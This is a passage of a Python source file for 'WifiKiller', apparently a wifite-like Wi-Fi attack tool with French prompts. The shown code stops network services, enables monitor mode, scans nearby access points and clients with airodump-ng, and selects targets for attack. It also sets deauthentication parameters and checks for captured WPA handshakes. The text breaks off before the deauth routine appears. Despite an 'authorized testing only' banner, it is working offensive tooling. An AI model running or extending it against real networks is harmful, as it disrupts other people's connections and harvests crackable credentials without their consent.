#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  WifiKiller v1.0 - Advanced Wi-Fi Auditing Tool                 ║
║  A modern replacement for wifite                                 ║
║  Author: WifiKiller Team                                        ║
║  License: For educational & authorized testing purposes only     ║
╚══════════════════════════════════════════════════════════════════╝

Requirements:
  - Linux with root privileges
  - aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng)
  - hcxtools (hcxpcapngtool)
  - Python 3.8+ with 'rich' library

Usage:
  sudo python3 wifikiller.py [options]
"""

import os
import sys
import re
import csv
import time
import signal
import shutil
import argparse
import subprocess
import threading
from datetime import datetime
from pathlib import Path

# ── Rich imports for beautiful terminal UI ──────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.live import Live
    from rich.layout import Layout
    from rich.align import Align
    from rich import box
except ImportError:
    print("[!] La librairie 'rich' n'est pas installée.")
    print("[*] Installation: pip3 install rich")
    sys.exit(1)

console = Console()

# ════════════════════════════════════════════════════════════════
#  CONSTANTS & CONFIG
# ════════════════════════════════════════════════════════════════

VERSION = "1.0.0"
BANNER_COLOR = "bright_cyan"
HANDSHAKE_DIR = "handshakes"
HASHCAT_DIR = "hc22000"
SCAN_OUTPUT_PREFIX = "/tmp/wifikiller_scan"
DEAUTH_PACKETS = 15          # Number of deauth packets per burst
DEAUTH_ROUNDS = 5            # Number of deauth rounds per network
HANDSHAKE_TIMEOUT = 90       # Seconds to wait for handshake per network
CHANNEL_HOP_DELAY = 0.5      # Delay between channel hops (seconds)

# Colors / styles
STYLE_HEADER = "bold bright_cyan"
STYLE_SUCCESS = "bold green"
STYLE_ERROR = "bold red"
STYLE_WARNING = "bold yellow"
STYLE_INFO = "bold white"
STYLE_DIM = "dim"
STYLE_HIGHLIGHT = "bold bright_magenta"

# ════════════════════════════════════════════════════════════════
#  BANNER
# ════════════════════════════════════════════════════════════════

BANNER = r"""
[bright_cyan]
 ██╗    ██╗██╗███████╗██╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██║    ██║██║██╔════╝██║██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ██║ █╗ ██║██║█████╗  ██║█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██║███╗██║██║██╔══╝  ██║██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ╚███╔███╔╝██║██║     ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
  ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
[/bright_cyan]
[dim]                  ── Advanced Wi-Fi Auditing Tool v{version} ──[/dim]
[dim bright_red]         ⚠  For authorized penetration testing only  ⚠[/dim bright_red]
"""

# ════════════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ════════════════════════════════════════════════════════════════

def check_root():
    """Verify we are running as root."""
    if os.geteuid() != 0:
        console.print("\n[bold red]✘ Ce script doit être lancé en root (sudo).[/bold red]")
        console.print("[dim]  Essaye : sudo python3 wifikiller.py[/dim]\n")
        sys.exit(1)


def check_dependencies():
    """Check that all required tools are installed."""
    tools = {
        "airmon-ng":      "aircrack-ng",
        "airodump-ng":    "aircrack-ng",
        "aireplay-ng":    "aircrack-ng",
        "aircrack-ng":    "aircrack-ng",
        "hcxpcapngtool":  "hcxtools",
        "iw":             "iw",
    }
    missing = []
    for tool, package in tools.items():
        if shutil.which(tool) is None:
            missing.append((tool, package))

    if missing:
        console.print(f"\n[{STYLE_ERROR}]✘ Outils manquants :[/{STYLE_ERROR}]")
        for tool, pkg in missing:
            console.print(f"  [red]•[/red] {tool}  [dim](paquet: {pkg})[/dim]")
        console.print(f"\n[{STYLE_INFO}]Installe-les avec : sudo apt install {' '.join(set(p for _, p in missing))}[/{STYLE_INFO}]\n")
        sys.exit(1)


def run_cmd(cmd, timeout=None, capture=True):
    """Run a shell command and return (returncode, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=capture,
            text=True, timeout=timeout
        )
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"
    except Exception as e:
        return -1, "", str(e)


def run_cmd_bg(cmd):
    """Run a command in background, return the Popen object."""
    return subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )


def kill_process_group(proc):
    """Kill a process and its entire process group."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            time.sleep(0.5)
            if proc.poll() is None:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except (ProcessLookupError, PermissionError):
            pass


def cleanup_temp_files():
    """Remove temporary scan files."""
    import glob
    for f in glob.glob(f"{SCAN_OUTPUT_PREFIX}*"):
        try:
            os.remove(f)
        except OSError:
            pass


def get_signal_bars(power):
    """Convert dBm power to a visual bar indicator."""
    if power >= -50:
        return "[bright_green]████[/bright_green]"
    elif power >= -60:
        return "[green]███[/green][dim]░[/dim]"
    elif power >= -70:
        return "[yellow]██[/yellow][dim]░░[/dim]"
    elif power >= -80:
        return "[red]█[/red][dim]░░░[/dim]"
    else:
        return "[bright_red]▏[/bright_red][dim]░░░[/dim]"


def get_encryption_style(encryption):
    """Return styled encryption text."""
    enc = encryption.upper().strip()
    if "WPA3" in enc:
        return f"[bright_magenta]{enc}[/bright_magenta]"
    elif "WPA2" in enc:
        return f"[bright_cyan]{enc}[/bright_cyan]"
    elif "WPA" in enc:
        return f"[cyan]{enc}[/cyan]"
    elif "WEP" in enc:
        return f"[bright_red]{enc}[/bright_red]"
    elif "OPN" in enc or "OPEN" in enc:
        return f"[bright_green]{enc}[/bright_green]"
    return f"[white]{enc}[/white]"


# ════════════════════════════════════════════════════════════════
#  NETWORK CLASS
# ════════════════════════════════════════════════════════════════

class Network:
    """Represents a discovered Wi-Fi network."""

    def __init__(self, bssid, channel, power, encryption, cipher, auth, essid):
        self.bssid = bssid.strip().upper()
        self.channel = channel.strip()
        self.power = int(power.strip()) if power.strip().lstrip('-').isdigit() else -100
        self.encryption = encryption.strip()
        self.cipher = cipher.strip()
        self.auth = auth.strip()
        self.essid = essid.strip() if essid.strip() else "<Hidden>"
        self.clients = 0
        self.handshake_captured = False
        self.handshake_file = None
        self.hc22000_file = None

    def __repr__(self):
        return f"Network({self.essid}, {self.bssid}, CH:{self.channel}, {self.power}dBm, {self.encryption})"


# ════════════════════════════════════════════════════════════════
#  CLIENT CLASS
# ════════════════════════════════════════════════════════════════

class Client:
    """Represents a connected Wi-Fi client."""

    def __init__(self, station_mac, bssid, power="", packets="", probes=""):
        self.station_mac = station_mac.strip().upper()
        self.bssid = bssid.strip().upper()
        self.power = int(power.strip()) if power.strip().lstrip('-').isdigit() else -100
        self.packets = packets.strip()
        self.probes = probes.strip()


# ════════════════════════════════════════════════════════════════
#  WIFIKILLER MAIN CLASS
# ════════════════════════════════════════════════════════════════

class WifiKiller:
    """Main WifiKiller class orchestrating the entire workflow."""

    def __init__(self, args=None):
        self.interface = None
        self.monitor_interface = None
        self.networks = []
        self.clients = []
        self.scan_process = None
        self.scanning = False
        self.start_time = datetime.now()
        self.session_dir = None
        self.args = args

        # Create output directories
        os.makedirs(HANDSHAKE_DIR, exist_ok=True)
        os.makedirs(HASHCAT_DIR, exist_ok=True)

        # Create session directory
        session_name = self.start_time.strftime("session_%Y%m%d_%H%M%S")
        self.session_dir = Path(HANDSHAKE_DIR) / session_name
        os.makedirs(self.session_dir, exist_ok=True)

        # Signal handler for clean exit
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully."""
        console.print(f"\n\n[{STYLE_WARNING}]⚠  Interruption détectée. Nettoyage en cours...[/{STYLE_WARNING}]")
        self.cleanup()
        sys.exit(0)

    # ────────────────────────────────────────────────────────────
    #  STEP 1: CHECK KILL
    # ────────────────────────────────────────────────────────────

    def check_kill(self):
        """Kill interfering processes (NetworkManager, wpa_supplicant, etc.)."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 1/6 : Check Kill ━━━[/{STYLE_HEADER}]")
        console.print(f"[{STYLE_DIM}]Arrêt des processus interférant avec le mode monitor...[/{STYLE_DIM}]")

        with console.status("[bold cyan]Killing interfering processes..."):
            # airmon-ng check kill
            ret, stdout, stderr = run_cmd("airmon-ng check kill")

        if ret == 0:
            # Parse killed processes
            killed = []
            for line in (stdout + stderr).splitlines():
                line = line.strip()
                if line and any(svc in line.lower() for svc in
                                ["networkmanager", "wpa_supplicant", "dhclient", "avahi"]):
                    killed.append(line)

            if killed:
                console.print(f"[{STYLE_SUCCESS}]✔ Processus arrêtés :[/{STYLE_SUCCESS}]")
                for k in killed:
                    console.print(f"  [green]•[/green] {k}")
            else:
                console.print(f"[{STYLE_SUCCESS}]✔ Aucun processus interférant trouvé.[/{STYLE_SUCCESS}]")
        else:
            console.print(f"[{STYLE_WARNING}]⚠ airmon-ng check kill a retourné une erreur. Tentative manuelle...[/{STYLE_WARNING}]")
            for svc in ["NetworkManager", "wpa_supplicant", "dhclient"]:
                run_cmd(f"systemctl stop {svc} 2>/dev/null; killall {svc} 2>/dev/null")
            console.print(f"[{STYLE_SUCCESS}]✔ Services arrêtés manuellement.[/{STYLE_SUCCESS}]")

    # ────────────────────────────────────────────────────────────
    #  STEP 2: SELECT INTERFACE & MONITOR MODE
    # ────────────────────────────────────────────────────────────

    def list_interfaces(self):
        """List available wireless interfaces."""
        interfaces = []
        ret, stdout, _ = run_cmd("iw dev 2>/dev/null")
        if ret == 0:
            current_iface = None
            for line in stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    current_iface = line.split()[-1]
                    interfaces.append(current_iface)

        if not interfaces:
            # Fallback: check /sys/class/net
            for iface in os.listdir("/sys/class/net"):
                wireless_dir = f"/sys/class/net/{iface}/wireless"
                if os.path.isdir(wireless_dir):
                    interfaces.append(iface)

        return interfaces

    def select_interface(self):
        """Ask user to select a wireless interface."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 2/6 : Sélection de l'interface ━━━[/{STYLE_HEADER}]")

        interfaces = self.list_interfaces()

        if not interfaces:
            console.print(f"[{STYLE_ERROR}]✘ Aucune interface Wi-Fi détectée ![/{STYLE_ERROR}]")
            console.print(f"[{STYLE_DIM}]Vérifie que ton adaptateur Wi-Fi est branché et reconnu.[/{STYLE_DIM}]")
            sys.exit(1)

        # Show interfaces
        table = Table(
            title="Interfaces Wi-Fi disponibles",
            box=box.ROUNDED,
            border_style="bright_cyan",
            title_style="bold bright_cyan",
            header_style="bold white",
        )
        table.add_column("#", style="bright_yellow", justify="center", width=4)
        table.add_column("Interface", style="bright_white")
        table.add_column("Driver", style="dim")
        table.add_column("Chipset", style="dim")

        for i, iface in enumerate(interfaces, 1):
            # Try to get driver info
            driver = ""
            chipset = ""
            driver_path = f"/sys/class/net/{iface}/device/driver"
            if os.path.islink(driver_path):
                driver = os.path.basename(os.readlink(driver_path))
            ret2, out2, _ = run_cmd(f"iw phy$(iw dev {iface} info 2>/dev/null | grep wiphy | awk '{{print $2}}') info 2>/dev/null | head -1")
            if ret2 == 0 and out2.strip():
                chipset = out2.strip()

            table.add_row(str(i), iface, driver, chipset)

        console.print(table)

        # Auto-select if only one
        if len(interfaces) == 1:
            self.interface = interfaces[0]
            console.print(f"[{STYLE_INFO}]Interface auto-sélectionnée : [bright_cyan]{self.interface}[/bright_cyan][/{STYLE_INFO}]")
        else:
            while True:
                choice = console.input(f"\n[{STYLE_HIGHLIGHT}]→ Choisis l'interface (nom ou #) : [/{STYLE_HIGHLIGHT}]").strip()
                if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                    self.interface = interfaces[int(choice) - 1]
                    break
                elif choice in interfaces:
                    self.interface = choice
                    break
                console.print(f"[{STYLE_ERROR}]Choix invalide. Réessaye.[/{STYLE_ERROR}]")

    def enable_monitor_mode(self):
        """Put the selected interface in monitor mode."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 3/6 : Mode Monitor ━━━[/{STYLE_HEADER}]")

        with console.status(f"[bold cyan]Activation du mode monitor sur {self.interface}..."):
            # First try setting it down and using iw
            run_cmd(f"ip link set {self.interface} down")
            time.sleep(0.3)

            # Try with airmon-ng
            ret, stdout, stderr = run_cmd(f"airmon-ng start {self.interface}")

            # Determine the monitor interface name
            combined = stdout + stderr
            self.monitor_interface = None

            # Parse airmon-ng output for the new interface name
            # Common patterns: "mon0", "wlan0mon", "(monitor mode enabled on wlan0mon)"
            match = re.search(r'monitor mode.*?enabled.*?on\s+(\S+)', combined, re.IGNORECASE)
            if match:
                self.monitor_interface = match.group(1).rstrip(')')
            else:
                match = re.search(r'\(monitor mode.*?(\w+mon\w*)\)', combined, re.IGNORECASE)
                if match:
                    self.monitor_interface = match.group(1)

            # If we couldn't parse it, try common names
            if not self.monitor_interface:
                for candidate in [f"{self.interface}mon", "mon0", self.interface]:
                    ret2, _, _ = run_cmd(f"iw dev {candidate} info 2>/dev/null")
                    if ret2 == 0:
                        self.monitor_interface = candidate
                        break

            # Last resort: try iw directly
            if not self.monitor_interface:
                run_cmd(f"iw dev {self.interface} set type monitor")
                run_cmd(f"ip link set {self.interface} up")
                ret2, _, _ = run_cmd(f"iw dev {self.interface} info")
                if ret2 == 0:
                    self.monitor_interface = self.interface

        if self.monitor_interface:
            # Verify monitor mode is active
            ret, stdout, _ = run_cmd(f"iw dev {self.monitor_interface} info")
            if "monitor" in stdout.lower():
                console.print(f"[{STYLE_SUCCESS}]✔ Mode monitor activé sur [bright_cyan]{self.monitor_interface}[/bright_cyan][/{STYLE_SUCCESS}]")
            else:
                console.print(f"[{STYLE_WARNING}]⚠ Interface {self.monitor_interface} créée mais mode monitor non confirmé.[/{STYLE_WARNING}]")
                console.print(f"[{STYLE_INFO}]  On continue quand même...[/{STYLE_INFO}]")
        else:
            console.print(f"[{STYLE_ERROR}]✘ Impossible d'activer le mode monitor ![/{STYLE_ERROR}]")
            console.print(f"[{STYLE_DIM}]Vérifie que ton adaptateur supporte l'injection de paquets.[/{STYLE_DIM}]")
            sys.exit(1)

    # ────────────────────────────────────────────────────────────
    #  STEP 3: SCAN NETWORKS
    # ────────────────────────────────────────────────────────────

    def _parse_scan_csv(self):
        """Parse the airodump-ng CSV output file."""
        csv_file = f"{SCAN_OUTPUT_PREFIX}-01.csv"

        if not os.path.exists(csv_file):
            return [], []

        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
        except IOError:
            return [], []

        # Split into AP section and client section
        sections = content.split("Station MAC")

        # ── Parse APs (deduplicate by BSSID, keep strongest signal) ──
        seen_bssids = {}  # bssid -> Network (keeps the one with best power)

        if len(sections) >= 1:
            ap_section = sections[0]
            lines = ap_section.strip().splitlines()
            in_data = False
            for line in lines:
                if line.startswith("BSSID"):
                    in_data = True
                    continue
                if not in_data or not line.strip():
                    continue

                parts = line.split(',')
                if len(parts) >= 14:
                    bssid = parts[0].strip()
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                        continue

                    channel = parts[3].strip()
                    power = parts[8].strip()
                    encryption = parts[5].strip()
                    cipher = parts[6].strip()
                    auth = parts[7].strip()
                    essid = parts[13].strip() if len(parts) > 13 else ""

                    # Skip networks with power -1 (not in range)
                    power_int = int(power) if power.lstrip('-').isdigit() else -100
                    if power_int == -1:
                        continue

                    bssid_upper = bssid.strip().upper()

                    # Deduplicate: keep the entry with the strongest signal
                    if bssid_upper in seen_bssids:
                        existing = seen_bssids[bssid_upper]
                        if power_int > existing.power:
                            seen_bssids[bssid_upper] = Network(bssid, channel, power, encryption, cipher, auth, essid)
                        # If the existing one had a hidden ESSID but this one doesn't, update ESSID
                        elif essid.strip() and existing.essid == "<Hidden>":
                            existing.essid = essid.strip()
                    else:
                        seen_bssids[bssid_upper] = Network(bssid, channel, power, encryption, cipher, auth, essid)

        networks = list(seen_bssids.values())

        # ── Parse Clients (deduplicate by station MAC) ──
        seen_clients = {}  # station_mac -> Client

        if len(sections) >= 2:
            client_section = "Station MAC" + sections[1]
            lines = client_section.strip().splitlines()
            in_data = False
            for line in lines:
                if line.startswith("Station MAC"):
                    in_data = True
                    continue
                if not in_data or not line.strip():
                    continue

                parts = line.split(',')
                if len(parts) >= 6:
                    station = parts[0].strip()
                    bssid = parts[5].strip() if len(parts) > 5 else ""
                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', station):
                        continue
                    station_upper = station.strip().upper()
                    if station_upper not in seen_clients:
                        seen_clients[station_upper] = Client(station, bssid)

        clients = list(seen_clients.values())

        return networks, clients

    def _build_scan_table(self, networks, clients, elapsed):
        """Build a rich table for the live scan display."""
        
        # Prepare data based on mode
        grouped_networks = []
        if self.args.group:
            # Grouping logic for live view
            groups = {}
            for net in networks:
                # Count clients for this specific BSSID
                n_clients = 0
                for c in clients:
                    if c.bssid and c.bssid.upper() == net.bssid.upper():
                        n_clients += 1
                
                key = net.essid
                if key not in groups:
                    groups[key] = {
                        'essid': key,
                        'count': 0,
                        'channels': set(),
                        'power': -100,
                        'encryption': set(),
                        'cipher': set(),
                        'clients': 0
                    }
                g = groups[key]
                g['count'] += 1
                g['channels'].add(net.channel)
                if net.power > g['power']:
                    g['power'] = net.power
                g['encryption'].add(net.encryption)
                g['cipher'].add(net.cipher)
                g['clients'] += n_clients
            
            # Sort groups by power
            grouped_networks = sorted(groups.values(), key=lambda x: x['power'], reverse=True)
            display_list = grouped_networks
        else:
            # Standard logic
            # Calculate clients per AP
            client_count = {}
            for c in clients:
                if c.bssid and c.bssid != "(not associated)":
                    bssid_upper = c.bssid.upper()
                    client_count[bssid_upper] = client_count.get(bssid_upper, 0) + 1
            
            sorted_nets = sorted(networks, key=lambda n: n.power, reverse=True)
            display_list = sorted_nets

        table = Table(
            box=box.HEAVY_EDGE,
            border_style="bright_cyan",
            header_style="bold bright_white on dark_blue",
            row_styles=["", "on grey7"],
            pad_edge=True,
            expand=True,
        )

        table.add_column("#", style="bright_yellow", justify="center", width=4)
        table.add_column("ESSID", style="bright_white", min_width=15, max_width=30)
        
        if self.args.group:
            table.add_column("APs", justify="center", width=4)
            table.add_column("CH", style="bright_yellow", justify="center", width=10)
        else:
            table.add_column("BSSID", style="dim cyan", width=19)
            table.add_column("CH", style="bright_yellow", justify="center", width=4)
            
        table.add_column("PWR", justify="center", width=5)
        table.add_column("Signal", justify="center", width=8)
        table.add_column("ENC", justify="center", width=10)
        table.add_column("CIPHER", style="dim", justify="center", width=8)
        table.add_column("Clients", style="bright_green", justify="center", width=8)

        for i, item in enumerate(display_list, 1):
            if self.args.group:
                # Item is a dict from grouping
                essid = item['essid']
                count = str(item['count'])
                channels = ",".join(sorted(list(set(item['channels'])), key=lambda x: int(x) if x.isdigit() else 0))
                if len(channels) > 10: channels = channels[:8] + ".."
                power = item['power']
                enc_str = "/".join(sorted(list(item['encryption'])))[:10]
                cipher_str = "/".join(sorted(list(item['cipher'])))[:8]
                clients_count = item['clients']
            else:
                # Item is Network object
                essid = item.essid
                bssid = item.bssid # Used below, but we need to adapt the row
                count = "-"
                channels = item.channel
                power = item.power
                enc_str = item.encryption
                cipher_str = item.cipher
                clients_count = client_count.get(item.bssid.upper(), 0)

            client_str = f"[bright_green]{clients_count}[/bright_green]" if clients_count > 0 else "[dim]0[/dim]"
            pwr_str = f"[{'bright_green' if power >= -60 else 'yellow' if power >= -75 else 'red'}]{power}[/{'bright_green' if power >= -60 else 'yellow' if power >= -75 else 'red'}]"

            row_data = [str(i), essid]
            if self.args.group:
                row_data.extend([count, channels])
            else:
                row_data.extend([item.bssid, channels])
            
            row_data.extend([
                pwr_str,
                get_signal_bars(power),
                get_encryption_style(enc_str),
                cipher_str,
                client_str,
            ])
            table.add_row(*row_data)

        # Header panel
        scan_info = Text.assemble(
            ("🔍 SCAN EN COURS", "bold bright_cyan"),
            ("  │  ", "dim"),
            (f"Interface: {self.monitor_interface}", "bright_white"),
            ("  │  ", "dim"),
            (f"Réseaux: {len(display_list)}", "bright_green"),
            ("  │  ", "dim"),
            (f"Clients: {len(clients)}", "bright_yellow"),
            ("  │  ", "dim"),
            (f"Temps: {elapsed}", "dim"),
        )

        footer = Text("Appuie sur [ENTRÉE] pour arrêter le scan", style="bold bright_yellow")

        layout = Table.grid(padding=(0, 0))
        layout.add_row(Panel(scan_info, border_style="bright_cyan", box=box.ROUNDED))
        layout.add_row(table)
        layout.add_row(Align.center(footer))

        return layout

    def scan_networks(self):
        """Scan for Wi-Fi networks using airodump-ng with live display."""
        console.print(f"\n[{STYLE_HEADER}]━━━ ÉTAPE 4/6 : Scan des réseaux ━━━[/{STYLE_HEADER}]")
        console.print(f"[{STYLE_DIM}]Lancement du scan... Appuie sur [ENTRÉE] pour arrêter.[/{STYLE_DIM}]\n")

        # Clean up old scan files
        cleanup_temp_files()

        # Start airodump-ng in background
        scan_cmd = (
            f"airodump-ng {self.monitor_interface} "
            f"--write {SCAN_OUTPUT_PREFIX} "
            f"--write-interval 1 "
            f"--output-format csv "
            f"--berlin 10"
        )
        self.scan_process = run_cmd_bg(scan_cmd)
        self.scanning = True

        # Thread to wait for Enter key
        stop_event = threading.Event()

        def wait_for_enter():
            try:
                input()
                stop_event.set()
            except EOFError:
                stop_event.set()

        input_thread = threading.Thread(target=wait_for_enter, daemon=True)
        input_thread.start()

        scan_start = time.time()

        # Live display loop
        try:
            with Live(console=console, refresh_per_second=2, transient=True) as live:
                while not stop_event.is_set():
                    elapsed_secs = int(time.time() - scan_start)
                    elapsed_str = f"{elapsed_secs // 60:02d}:{elapsed_secs % 60:02d}"

                    networks, clients = self._parse_scan_csv()
                    display = self._build_scan_table(networks, clients, elapsed_str)
                    live.update(display)

                    # Small sleep to avoid busy loop
                    stop_event.wait(timeout=0.5)
        except KeyboardInterrupt:
            pass

        # Stop scanning
        self.scanning = False
        kill_process_group(self.scan_process)
        self.scan_process = None

        # Final parse
        time.sleep(0.5)
        self.networks, self.clients = self._parse_scan_csv()

        # Count clients per AP
        client_count = {}
        for c in self.clients:
            if c.bssid and c.bssid.upper() != "(NOT ASSOCIATED)":
                bssid_upper = c.bssid.upper()
                client_count[bssid_upper] = client_count.get(bssid_upper, 0) + 1

        for net in self.networks:
            net.clients = client_count.get(net.bssid.upper(), 0)

        # Sort by power
        self.networks.sort(key=lambda n: n.power, reverse=True)

        console.print(f"\n[{STYLE_SUCCESS}]✔ Scan terminé ! {len(self.networks)} réseaux détectés.[/{STYLE_SUCCESS}]\n")

    # ────────────────────────────────────────────────────────────
    #  STEP 4: DISPLAY RESULTS & SELECT TARGETS
    # ────────────────────────────────────────────────────────────

    # ────────────────────────────────────────────────────────────
    #  STEP 4: DISPLAY RESULTS & SELECT TARGETS (MODIFIED FOR GROUPING)
    # ────────────────────────────────────────────────────────────

    def _group_networks(self, networks):
        """Helper to group networks by ESSID."""
        groups = {}
        for net in networks:
            # Update net.clients if not already set (re-calculate from self.clients list done in scan_networks)
            # stored in the group
            
            key = net.essid
            if key not in groups:
                groups[key] = {
                    'essid': key,
                    'bssids': [],
                    'networks': [],
                    'channels': set(),
                    'power': -100,
                    'encryption': set(),
                    'cipher': set(),
                    'auth': set(),
                    'clients': 0
                }
            g = groups[key]
            g['networks'].append(net)
            g['bssids'].append(net.bssid)
            g['channels'].add(net.channel)
            if net.power > g['power']:
                g['power'] = net.power
            g['encryption'].add(net.encryption)
            g['cipher'].add(net.cipher)
            g['auth'].add(net.auth)
            g['clients'] += net.clients
        
        # Convert to list sorted by power
        return sorted(groups.values(), key=lambda x: x['power'], reverse=True)

    def display_and_select_targets(self):
        """Display scanned networks and let user select targets."""
        console.print(f"[{STYLE_HEADER}]━━━ ÉTAPE 5/6 : Sélection des cibles ━━━[/{STYLE_HEADER}]\n")

        if not self.networks:
            console.print(f"[{STYLE_ERROR}]✘ Aucun réseau détecté. Vérifie ton antenne et réessaye.[/{STYLE_ERROR}]")
            self.cleanup()
            sys.exit(1)

        # Handle Grouped Mode vs Normal Mode
        display_items = []
        if self.args.group:
            display_items = self._group_networks(self.networks)
        else:
            display_items = self.networks

        # Build results table
        table = Table(
            title=f"📡 Réseaux Wi-Fi détectés ({'GROUPÉS' if self.args.group else 'DÉTAILLÉS'})",
            box=box.DOUBLE_EDGE,
            border_style="bright_cyan",
            title_style="bold bright_cyan",
            header_style="bold bright_white on dark_blue",
            row_styles=["", "on grey7"],
            expand=True,
        )
        
        table.add_column("#", style="bright_yellow", justify="center", width=4)
        table.add_column("ESSID", style="bright_white", min_width=12, max_width=28)
        
        if self.args.group:
            table.add_column("APs", justify="center", width=4)
            table.add_column("CH", style="bright_yellow", justify="center", width=10)
        else:
            table.add_column("BSSID", style="dim cyan", width=19)
            table.add_column("CH", style="bright_yellow", justify="center", width=4)
            
        table.add_column("PWR", justify="center", width=5)
        table.add_column("Signal", justify="center", width=8)
        table.add_column("ENC", justify="center", width=10)
        table.add_column("CIPHER", style="dim", justify="center", width=8)
        table.add_column("AUTH", style="dim", justify="center", width=6)
        table.add_column("Clients", style="bright_green", justify="center", width=8)

        for i, item in enumerate(display_items, 1):
            if self.args.group:
                # Group Item
                essid = item['essid']
                count = str(len(item['networks']))
                channels = ",".join(sorted(list(set(item['channels'])), key=lambda x: int(x) if x.isdigit() else 0))
                if len(channels) > 10: channels = channels[:8] + ".."
                power = item['power']
                enc_str = "/".join(sorted(list(item['encryption'])))[:10]
                cipher_str = "/".join(sorted(list(item['cipher'])))[:8]
                auth_str = "/".join(sorted(list(item['auth'])))[:6]
                clients_count = item['clients']
            else:
                # Network Item
                essid = item.essid
                bssid = item.bssid
                count = "-"
                channels = item.channel
                power = item.power
                enc_str = item.encryption
                cipher_str = item.cipher
                auth_str = item.auth
                clients_count = item.clients

            client_str = f"[bright_green]{clients_count}[/bright_green]" if clients_count > 0 else "[dim]0[/dim]"
            pwr_color = 'bright_green' if power >= -60 else 'yellow' if power >= -75 else 'red'
            pwr_str = f"[{pwr_color}]{power}[/{pwr_color}]"

            row_data = [
                str(i),
                essid,
            ]
            
            if self.args.group:
                row_data.extend([count, channels])
            else:
                row_data.extend([bssid, channels])
                
            row_data.extend([
                pwr_str,
                get_signal_bars(power),
                get_encryption_style(enc_str),
                cipher_str,
                auth_str,
                client_str,
            ])
            
            table.add_row(*row_data)

        console.print(table)
        console.print()

        # Selection prompt
        console.print(Panel(
            "[bright_white]Sélectionne les réseaux pour capturer le handshake :\n\n"
            "  [bright_yellow]•[/bright_yellow] Un numéro unique    : [bright_cyan]3[/bright_cyan]\n"
            "  [bright_yellow]•[/bright_yellow] Plusieurs numéros   : [bright_cyan]1,3,5[/bright_cyan]\n"
            "  [bright_yellow]•[/bright_yellow] Une plage           : [bright_cyan]1-5[/bright_cyan]\n"
            "  [bright_yellow]•[/bright_yellow] Tous les réseaux    : [bright_cyan]all[/bright_cyan]\n"
            "  [bright_yellow]•[/bright_yellow] Quitter             : [bright_cyan]q[/bright_cyan][/bright_white]",
            title="Sélection",
            border_style="bright_magenta",
            box=box.ROUNDED,
        ))

        while True:
            choice = console.input(f"\n[{STYLE_HIGHLIGHT}]→ Ton choix : [/{STYLE_HIGHLIGHT}]").strip().lower()

            if choice == 'q':
                console.print(f"[{STYLE_WARNING}]Abandon. Nettoyage...[/{STYLE_WARNING}]")
                self.cleanup()
                sys.exit(0)

            if choice == 'all':
                selected_indices = list(range(len(display_items)))
                break

            # Parse selection
            try:
                selected_indices = []
                for part in choice.split(','):
                    part = part.strip()
                    if '-' in part:
                        start, end = part.split('-', 1)
                        start, end = int(start.strip()), int(end.strip())
                        if start < 1 or end > len(display_items) or start > end:
                            raise ValueError
                        selected_indices.extend(range(start - 1, end))
                    else:
                        num = int(part)
                        if num < 1 or num > len(display_items):
                            raise ValueError
                        selected_indices.append(num - 1)

                # Deduplicate
                selected_indices = list(dict.fromkeys(selected_indices))
                break
            except (ValueError, IndexError):
                console.print(f"[{STYLE_ERROR}]Entrée invalide. Essaye encore.[/{STYLE_ERROR}]")

        # Convert selection to actual targets list
        final_targets = []
        for idx in selected_indices:
            item = display_items[idx]
            if self.args.group:
                # Add all networks from the group
                final_targets.extend(item['networks'])
            else:
                final_targets.append(item)

        targets = final_targets
        console.print(f"\n[{STYLE_SUCCESS}]✔ {len(targets)} réseau(x) sélectionné(s) pour l'attaque (Total APs).[/{STYLE_SUCCESS}]")
        
        # Show summary of targets
        unique_essids = list(set([t.essid for t in targets]))
        for essid in unique_essids[:10]:
             console.print(f"  [bright_cyan]►[/bright_cyan] {essid}")
        if len(unique_essids) > 10:
            console.print(f"  [dim]... et {len(unique_essids)-10} autres[/dim]")

        return targets

    # ────────────────────────────────────────────────────────────
    #  STEP 5: DEAUTH ATTACK & HANDSHAKE CAPTURE
    # ────────────────────────────────────────────────────────────


    def _check_handshake(self, cap_file, bssid):
        """Check if a valid handshake exists in the capture file."""
        if not os.path.exists(cap_file):
            return False

        # Use aircrack-ng to check for handshake
        ret, stdout, _ = run_cmd(f"aircrack-ng {cap_file} 2>/dev/null")
        if ret == 0 and bssid.upper() in stdout.upper():
            if "1 handshake" in stdout.lower() or "handshake" in stdout.lower():
                return True
        return False

    def _find_cap_file(self, prefix):
        """Find the actual cap file created by airodump-ng."""
        import glob
        patterns = [
            f"{prefix}-01.cap",
            f"{prefix}.cap",
            f"{prefix}-01.pcap",
